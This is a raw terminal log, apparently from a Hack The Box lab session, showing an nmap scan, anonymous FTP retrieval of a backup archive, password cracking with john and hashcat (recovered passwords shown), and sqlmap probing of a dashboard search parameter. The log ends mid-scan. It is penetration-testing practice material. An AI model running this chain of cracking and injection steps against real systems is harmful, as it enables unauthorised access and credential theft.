2cb42f8734ea607eefed3b70af13bbd3┌──(kali@kali)-[~/HTB]
└─$ dsza4rt~y~~~~~`     ~]=~OP~7~8~9~0-P[=]\
bquote> .HEGFWBDQSC                                                                
bquote> .HEGFWBDQSCsXsZGVY2H3BUI4NKO5MLP,HY,JM7IR67UE54Y6WT3R2ZSAqszXDC r,VQBgwnsmhejda<O>)|:_}2~P";2~t~-[ r~peow~9~i8~q7~~543a23we45r~t6~y7~
bquote> ;2~|_
bquote> ip akm
bquote> ssc
bquote> 
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ 
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ nmap -sC -sV 10.129.120.3  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 22:00 EDT
Nmap scan report for 10.129.120.3
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.21
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ftp 10.129.120.3                                  
Connected to 10.129.120.3.
220 (vsFTPd 3.0.3)
Name (10.129.120.3:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10286|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> cd ../../
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10264|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10580|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |****************************************************************************************************************|  2533      609.26 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (52.96 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ls
academy.ovpn  backup.zip  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ unzip backup.zip         
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ls
academy.ovpn  backup.zip  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ john --hlp                                       
Unknown option: "--hlp"
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ john --help               
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

--help                     Print usage summary
--single[=SECTION[,..]]    "Single crack" mode, using default or named rules
--single=:rule[,..]        Same, using "immediate" rule(s)
--single-seed=WORD[,WORD]  Add static seed word(s) for all salts in single mode
--single-wordlist=FILE     *Short* wordlist with static seed words/morphemes
--single-user-seed=FILE    Wordlist with seeds per username (user:password[s]
                           format)
--single-pair-max=N        Override max. number of word pairs generated (6)
--no-single-pair           Disable single word pair generation
--[no-]single-retest-guess Override config for SingleRetestGuess
--wordlist[=FILE] --stdin  Wordlist mode, read words from FILE or stdin
                  --pipe   like --stdin, but bulk reads, and allows rules
--rules[=SECTION[,..]]     Enable word mangling rules (for wordlist or PRINCE
                           modes), using default or named rules
--rules=:rule[;..]]        Same, using "immediate" rule(s)
--rules-stack=SECTION[,..] Stacked rules, applied after regular rules or to
                           modes that otherwise don't support rules
--rules-stack=:rule[;..]   Same, using "immediate" rule(s)
--rules-skip-nop           Skip any NOP ":" rules (you already ran w/o rules)
--loopback[=FILE]          Like --wordlist, but extract words from a .pot file
--mem-file-size=SIZE       Size threshold for wordlist preload (default 2048 MB)
--dupe-suppression         Suppress all dupes in wordlist (and force preload)
--incremental[=MODE]       "Incremental" mode [using section MODE]
--incremental-charcount=N  Override CharCount for incremental mode
--external=MODE            External mode or word filter
--mask[=MASK]              Mask mode using MASK (or default from john.conf)
--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
--mkv-stats=FILE           "Markov" stats file
--prince[=FILE]            PRINCE mode, read words from FILE
--prince-loopback[=FILE]   Fetch words from a .pot file
--prince-elem-cnt-min=N    Minimum number of elements per chain (1)
--prince-elem-cnt-max=[-]N Maximum number of elements per chain (negative N is
                           relative to word length) (8)
--prince-skip=N            Initial skip
--prince-limit=N           Limit number of candidates generated
--prince-wl-dist-len       Calculate length distribution from wordlist
--prince-wl-max=N          Load only N words from input wordlist
--prince-case-permute      Permute case of first letter
--prince-mmap              Memory-map infile (not available with case permute)
--prince-keyspace          Just show total keyspace that would be produced
                           (disregarding skip and limit)
--subsets[=CHARSET]        "Subsets" mode (see doc/SUBSETS)
--subsets-required=N       The N first characters of "subsets" charset are
                           the "required set"
--subsets-min-diff=N       Minimum unique characters in subset
--subsets-max-diff=[-]N    Maximum unique characters in subset (negative N is
                           relative to word length)
--subsets-prefer-short     Prefer shorter candidates over smaller subsets
--subsets-prefer-small     Prefer smaller subsets over shorter candidates
--make-charset=FILE        Make a charset, FILE will be overwritten
--stdout[=LENGTH]          Just output candidate passwords [cut at LENGTH]
--session=NAME             Give a new session the NAME
--status[=NAME]            Print status of a session [called NAME]
--restore[=NAME]           Restore an interrupted session [called NAME]
--[no-]crack-status        Emit a status line whenever a password is cracked
--progress-every=N         Emit a status line every N seconds
--show[=left]              Show cracked passwords [if =left, then uncracked]
--show=formats             Show information about hashes in a file (JSON)
--show=invalid             Show lines that are not valid for selected format(s)
--test[=TIME]              Run tests and benchmarks for TIME seconds each
                           (if TIME is explicitly 0, test w/o benchmark)
--stress-test[=TIME]       Loop self tests forever
--test-full=LEVEL          Run more thorough self-tests
--no-mask                  Used with --test for alternate benchmark w/o mask
--skip-self-tests          Skip self tests
--users=[-]LOGIN|UID[,..]  [Do not] load this (these) user(s) only
--groups=[-]GID[,..]       Load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]     Load users with[out] this (these) shell(s) only
--salts=[-]COUNT[:MAX]     Load salts with[out] COUNT [to MAX] hashes, or
--salts=#M[-N]             Load M [to N] most populated salts
--costs=[-]C[:M][,...]     Load salts with[out] cost value Cn [to Mn]. For
                           tunable cost parameters, see doc/OPTIONS
--fork=N                   Fork N processes
--node=MIN[-MAX]/TOTAL     This node's number range out of TOTAL count
--save-memory=LEVEL        Enable memory saving, at LEVEL 1..3
--log-stderr               Log to screen instead of file
--verbosity=N              Change verbosity (1-5 or 6 for debug, default 3)
--no-log                   Disables creation and writing to john.log file
--bare-always-valid=Y      Treat bare hashes as valid (Y/N)
--catch-up=NAME            Catch up with existing (paused) session NAME
--config=FILE              Use FILE instead of john.conf or john.ini
--encoding=NAME            Input encoding (eg. UTF-8, ISO-8859-1). See also
                           doc/ENCODINGS.
--input-encoding=NAME      Input encoding (alias for --encoding)
--internal-codepage=NAME   Codepage used in rules/masks (see doc/ENCODINGS)
--target-encoding=NAME     Output encoding (used by format)
--force-tty                Set up terminal for reading keystrokes even if we're
                           not the foreground process
--field-separator-char=C   Use 'C' instead of the ':' in input and pot files
--[no-]keep-guessing       Try finding plaintext collisions
--list=WHAT                List capabilities, see --list=help or doc/OPTIONS
--length=N                 Shortcut for --min-len=N --max-len=N
--min-length=N             Request a minimum candidate length in bytes
--max-length=N             Request a maximum candidate length in bytes
--max-candidates=[-]N      Gracefully exit after this many candidates tried.
                           (if negative, reset count on each crack)
--max-run-time=[-]N        Gracefully exit after this many seconds (if negative,
                           reset timer on each crack)
--mkpc=N                   Request a lower max. keys per crypt
--no-loader-dupecheck      Disable the dupe checking when loading hashes
--pot=NAME                 Pot file to use
--regen-lost-salts=N       Brute force unknown salts (see doc/OPTIONS)
--reject-printable         Reject printable binaries
--tune=HOW                 Tuning options (auto/report/N)
--subformat=FORMAT         Pick a benchmark format for --format=crypt
--format=[NAME|CLASS][,..] Force hash of type NAME. The supported formats can
                           be seen with --list=formats and --list=subformats.
                           See also doc/OPTIONS for more advanced selection of
                           format(s), including using classes and wildcards.
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ zip2john > hashes    
Usage: zip2john [options] [zip file(s)]
 -s Scan archive from the beginning, looking for local file headers. This
    is less reliable than going by the central index, but might work better
    with corrupted or split archives.
Options for 'old' PKZIP encrypted files only:
 -a <filename>   This is a 'known' ASCII file. This can be faster, IF all
    files are larger, and you KNOW that at least one of them starts out as
    'pure' ASCII data.
 -o <filename>   Only use this file from the .zip file.
 -c This will create a 'checksum only' hash.  If there are many encrypted
    files in the .zip file, then this may be an option, and there will be
    enough data that false positives will not be seen.  Up to 8 files are
    supported. These hashes do not reveal actual file data.
 -m Use "file magic" as known-plain if applicable. This can be faster but
    not 100% safe in all situations.

NOTE: By default it is assumed that all files in each archive have the same
password. If that's not the case, the produced hash may be uncrackable.
To avoid this, use -o option to pick a file at a time.
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ zip2john backup.zip > hashes
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ls
academy.ovpn  backup.zip  hashes  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ cat hashes    
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ john -wordlist=/usr/share/wordlist/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
fopen: /usr/share/wordlist/rockyou.txt: No such file or directory
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ find "rockyou.txt"                                   
find: ‘rockyou.txt’: No such file or directory
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ cd ../../../                       
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ find "rockyou.txt"
find: ‘rockyou.txt’: No such file or directory
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ find -help        
Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

Default path is the current directory; default expression is -print.
Expression may consist of: operators, options, tests, and actions.

Operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2

Positional options (always true):
      -daystart -follow -nowarn -regextype -warn

Normal options (always true, specified before other expressions):
      -depth -files0-from FILE -maxdepth LEVELS -mindepth LEVELS
      -mount -noleaf -xdev -ignore_readdir_race -noignore_readdir_race

Tests (N can be +N or -N or N):
      -amin N -anewer FILE -atime N -cmin N -cnewer FILE -context CONTEXT
      -ctime N -empty -false -fstype TYPE -gid N -group NAME -ilname PATTERN
      -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
      -readable -writable -executable
      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
      -used N -user NAME -xtype [bcdpfls]

Actions:
      -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Other common options:
      --help                   display this help and exit
      --version                output version information and exit

Valid arguments for -D:
exec, opt, rates, search, stat, time, tree, all, help
Use '-D help' for a description of the options, or see find(1)

Please see also the documentation at https://www.gnu.org/software/findutils/.
You can report (and track progress on fixing) bugs in the "find"
program via the GNU findutils bug-reporting page at
https://savannah.gnu.org/bugs/?group=findutils or, if
you have no web access, by sending email to <bug-findutils@gnu.org>.
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ cd ../\                                                                    
> ls
cd: no such file or directory: ../ls
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ ls
bin   dev  home        initrd.img.old  lib32  lost+found  mnt  proc  run   srv   sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  media       opt  root  sbin  swap  tmp  var  vmlinuz.old
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ cd ../../   
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ ls
bin   dev  home        initrd.img.old  lib32  lost+found  mnt  proc  run   srv   sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  media       opt  root  sbin  swap  tmp  var  vmlinuz.old
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ locate "rockyou.txt"
/home/kali/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hashes
stat: hashes: No such file or directory
                                                                                                                                             
┌──(kali@kali)-[/]
└─$ cd ~/HTB                                              
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ls                  
academy.ovpn  backup.zip  hashes  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2025-07-27 22:27) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ unzip backup.zip                                      
Archive:  backup.zip
[backup.zip] index.php password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: index.php               incorrect password
[backup.zip] style.css password: 
password incorrect--reenter: 
password incorrect--reenter:                                                                                                                                              
┌──(kali@kali)-[~/HTB]
└─$ john --show hashes                                    
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip

1 password hash cracked, 0 left
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ unzip backup.zip  
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ ls
academy.ovpn  hashes            index.php     new_machine.ovpn  season.ovpn        style.css
backup.zip    htb_machine.ovpn  machine.ovpn  OSCP.ovpn         starting_vip.ovpn
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ open .    
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashid 2cb42f8734ea607eefed3b70af13bbd3                
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -a O -m O hash /user/share/wordlists/rockyou.txt
The specified parameter cannot use 'O' as a value - must be a number.

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -a 0 -m 0 hash /user/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

/user/share/wordlists/rockyou.txt: No such file or directory

Started: Sun Jul 27 22:32:27 2025
Stopped: Sun Jul 27 22:32:27 2025
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -a O -m O hash /usr/share/wordlists/rockyou.txt 
The specified parameter cannot use 'O' as a value - must be a number.

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat  hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 9 5900HS with Radeon Graphics, 2913/5890 MB (1024 MB allocatable), 4MCU

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)

Please specify the hash-mode with -m [hash-mode].

Started: Sun Jul 27 22:33:10 2025
Stopped: Sun Jul 27 22:33:12 2025
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -m  hash /usr/share/wordlists/rockyou.txt 
The specified parameter cannot use 'hash' as a value - must be a number.

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -m 1  hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Either the specified hash mode does not exist in the official repository,
or the file(s) could not be found. Please check that the hash mode number is
correct and that the files are in the correct place.

/usr/share/hashcat/modules/module_00001.so: cannot open shared object file: No such file or directory

Started: Sun Jul 27 22:33:41 2025
Stopped: Sun Jul 27 22:33:41 2025
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 9 5900HS with Radeon Graphics, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

2cb42f8734ea607eefed3b70af13bbd3:qwerty789                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
Time.Started.....: Sun Jul 27 22:34:12 2025 (0 secs)
Time.Estimated...: Sun Jul 27 22:34:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1426.7 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 100352/14344385 (0.70%)
Rejected.........: 0/100352 (0.00%)
Restore.Point....: 98304/14344385 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Dominic1 -> paashaas
Hardware.Mon.#1..: Util: 32%

Started: Sun Jul 27 22:33:50 2025
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- coockie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:43:20 /2025-07-27/

[22:43:20] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.120.3/index.php'. Do you want to follow? [Y/n] y
y
[22:43:29] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:43:29] [INFO] testing if the target URL content is stable
[22:43:29] [WARNING] GET parameter 'search' does not appear to be dynamic
[22:43:29] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[22:43:30] [INFO] testing for SQL injection on GET parameter 'search'
[22:43:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:43:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:43:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:43:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:43:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:43:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:43:33] [INFO] testing 'Generic inline queries'
[22:43:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:43:34] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                           
[22:43:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:43:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:43:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:43:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[22:43:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[22:43:37] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 

[22:43:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[22:43:46] [WARNING] GET parameter 'search' does not seem to be injectable
[22:43:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 22:43:46 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- coockie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:44:59 /2025-07-27/

[22:44:59] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.120.3/index.php'. Do you want to follow? [Y/n] 

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=5chigs0aq16...8l5u6a5ke0'). Do you want to use those [Y/n] 

[22:45:05] [INFO] testing if the target URL content is stable
[22:45:05] [WARNING] GET parameter 'search' does not appear to be dynamic
[22:45:05] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[22:45:05] [INFO] testing for SQL injection on GET parameter 'search'
[22:45:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:45:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:45:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:45:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
